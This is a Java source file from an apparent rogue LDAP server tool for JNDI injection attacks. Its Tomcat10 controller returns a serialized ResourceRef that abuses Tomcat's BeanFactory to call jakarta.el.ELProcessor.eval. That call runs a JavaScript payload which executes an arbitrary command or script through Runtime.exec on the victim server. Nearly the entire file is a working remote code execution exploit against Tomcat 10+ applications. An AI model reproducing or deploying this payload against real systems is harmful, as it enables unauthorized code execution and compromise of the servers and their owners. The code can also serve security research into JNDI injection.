package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

import java.nio.file.Files;
import java.nio.file.Path;

import static artsploit.Utilities.makeJavaScriptString;
import static artsploit.Utilities.serialize;

/**
 * Yields:
 *  Identical to the original Tomcat controller, except that jakarta.el.ELProcessor is used. This is necessary for
 *  Tomcat 10+, because it's using the new package names from Jakarta EE instead of Java EE.
 *
 *  When bean is created on the server side, we can control its class name and setter methods,
 *   so we can leverage {@link jakarta.el.ELProcessor#eval} method to execute arbitrary Java code via EL evaluation
 *
 * @see <a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">exploitation details</a>
 *
 * Requires:
 *  Tomcat 10+
 *  - tomcat-embed-core.jar
 *  - tomcat-embed-el.jar
 *
 * @author artsploit:
 */
@LdapMapping(uri = { "/o=tomcat10" })
public class Tomcat10 implements LdapController {
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        String payload;

        if (Config.jsPayloadPath.isEmpty()) {
            System.out.println("Using Config.command payload");
            payload = ("{" +
                    "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                    ".newInstance().getEngineByName(\"JavaScript\")" +
                    ".eval(\"java.lang.Runtime.getRuntime().exec(${command})\")" +
                    "}")
                    .replace("${command}", makeJavaScriptString(Config.command));

        } else {
            System.out.println("Using payload from " + Config.jsPayloadPath);
            var jsScript = Files.readString(Path.of(Config.jsPayloadPath));
            payload = ("{" +
                    "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                    ".newInstance().getEngineByName(\"JavaScript\")" +
                    ".eval(\"eval(${script})\")" +
                    "}")
                    .replace("${script}", makeJavaScriptString(jsScript));
        }

        System.out.println("Sending LDAP ResourceRef result for " + base + " with jakarta.el.ELProcessor payload");

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        // Prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory.
        ResourceRef ref = new ResourceRef("jakarta.el.ELProcessor", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", payload));
        e.addAttribute("javaSerializedData", serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}